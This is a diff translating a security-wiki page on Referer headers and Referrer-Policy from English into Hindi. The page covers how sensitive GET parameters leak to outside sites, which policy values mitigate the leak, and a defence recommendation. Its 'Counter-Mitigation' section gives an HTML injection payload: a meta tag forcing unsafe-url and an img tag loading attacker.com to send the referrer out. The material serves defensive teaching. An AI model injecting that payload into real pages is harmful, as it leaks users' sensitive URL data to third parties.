@@ -2,16 +2,15 @@
 
 # Referrer headers and policy
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Referrer वह हेडर है जिसका उपयोग ब्राउज़रों द्वारा यह संकेत करने के लिए किया जाता है कि कौन सा पिछला पृष्ठ देखा गया था।
 
 ## Sensitive information leaked
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+यदि किसी समय एक वेब पृष्ठ के अंदर कोई संवेदनशील जानकारी GET अनुरोध पैरामीटर पर स्थित है, यदि पृष्ठ में बाहरी स्रोतों के लिए लिंक हैं या एक हमलावर उपयोगकर्ता को एक URL पर जाने के लिए मजबूर/सुझाव देने में सक्षम है जो हमलावर द्वारा नियंत्रित है। यह नवीनतम GET अनुरोध के अंदर संवेदनशील जानकारी को निकालने में सक्षम हो सकता है।
 
 ## Mitigation
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो **संवेदनशील जानकारी** को अन्य वेब अनुप्रयोगों में भेजने से **बचा** सके:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## काउंटर-निवारण
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का शोषण करने की आवश्यकता है):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## रक्षा
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+कभी भी किसी संवेदनशील डेटा को GET पैरामीटर या URL में पथ के अंदर न रखें।
 
 {{#include ./banners/hacktricks-training.md}}
-
